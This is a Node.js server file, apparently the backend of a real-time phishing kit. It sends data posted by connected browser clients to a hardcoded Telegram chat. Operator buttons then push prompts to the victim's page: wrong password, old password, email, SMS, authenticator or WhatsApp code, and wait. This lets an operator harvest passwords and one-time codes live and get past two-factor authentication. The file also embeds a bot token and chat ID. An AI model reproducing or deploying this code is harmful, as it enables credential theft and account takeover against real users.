const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const http = require('http');

const app = express();
const botToken = '7539675476:AAG3HvyqvP4xapW_k6HG_VlsOTWvjiK5z7M'; // Replace with your real token
const bot = new TelegramBot(botToken, { polling: true });
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(bodyParser.json());

const clients = new Map();
const messageToUserMap = new Map();

wss.on('connection', (ws, req) => {
  const userId = uuidv4();
  const ip = req.socket.remoteAddress;

  clients.set(userId, ws);
  console.log(`Client connected: UserID: ${userId}, IP: ${ip}`);
  ws.send(JSON.stringify({ type: 'welcome', userId, ip }));

  ws.on('message', (message) => {
    console.log(`Message from ${userId}: ${message}`);
  });

  ws.on('close', () => {
    clients.delete(userId);
    console.log(`Client disconnected: ${userId}`);
  });
});

const sendToUser = (userId, data) => {
  const client = clients.get(userId);
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify(data));
  } else {
    console.error(`User ${userId} not connected.`);
  }
};

// Telegram Bot: Start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Control the frontend with buttons:', {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Show Modal', callback_data: 'show_modal' }],
        [{ text: 'Show Email Code', callback_data: 'show_email_code' }],
        [{ text: 'Show SMS Code', callback_data: 'show_sms_code' }],
        [{ text: 'Show Auth Code', callback_data: 'show_auth_code' }],
        [{ text: 'Show WhatsApp Code', callback_data: 'show_whatsapp_code' }],
        [{ text: 'Wrong Password', callback_data: 'wrong_password' }],
        [{ text: 'Old Password', callback_data: 'old_password' }],
        [{ text: 'Wait Time', callback_data: 'show_wait_time' }],
        [{ text: 'Redirect to Calendar', callback_data: 'redirect_calendar' }]
      ]
    }
  });
});

// Handle Button Interactions
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const userId = messageToUserMap.get(query.message.message_id);

  if (!userId) {
    console.error(`No userId for message ID: ${query.message.message_id}`);
    return bot.answerCallbackQuery(query.id);
  }

  const dataMap = {
    show_modal: { type: 'show_modal' },
    show_email_code: { type: 'showEmailCode' },
    show_sms_code: { type: 'showSmsCode' },
    show_auth_code: { type: 'showAuthCode' },
    show_whatsapp_code: { type: 'showWhatsappCode' },
    wrong_password: { type: 'showWrong' },
    old_password: { type: 'oldPass' },
    show_wait_time: { type: 'showWaitTime' },
    redirect_calendar: { type: 'showCalendar' }
  };

  const action = dataMap[query.data];
  if (action) sendToUser(userId, action);

  bot.answerCallbackQuery(query.id);
});

app.post('/send-message', (req, res) => {
  const { message, userId } = req.body;
  const chatId = '-1002327154709'; // Update this to your target chat

  if (!clients.has(userId)) {
    return res.status(404).send({ error: 'User not connected.' });
  }

  bot.sendMessage(chatId, message, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Wait', callback_data: 'show_wait_time' }],
        [{ text: 'Wrong Password', callback_data: 'wrong_password' }],
        [{ text: 'Email Code', callback_data: 'show_email_code' }],
        [{ text: 'SMS Code', callback_data: 'show_sms_code' }],
        [{ text: 'Auth Code', callback_data: 'show_auth_code' }],
        [{ text: 'WhatsApp Code', callback_data: 'show_whatsapp_code' }],
        [{ text: 'Calendar', callback_data: 'redirect_calendar' }]
      ]
    }
  }).then(sent => {
    messageToUserMap.set(sent.message_id, userId);
  });

  sendToUser(userId, { type: 'acknowledge', payload: 'Message sent successfully!' });
  res.send({ status: 'Message sent' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
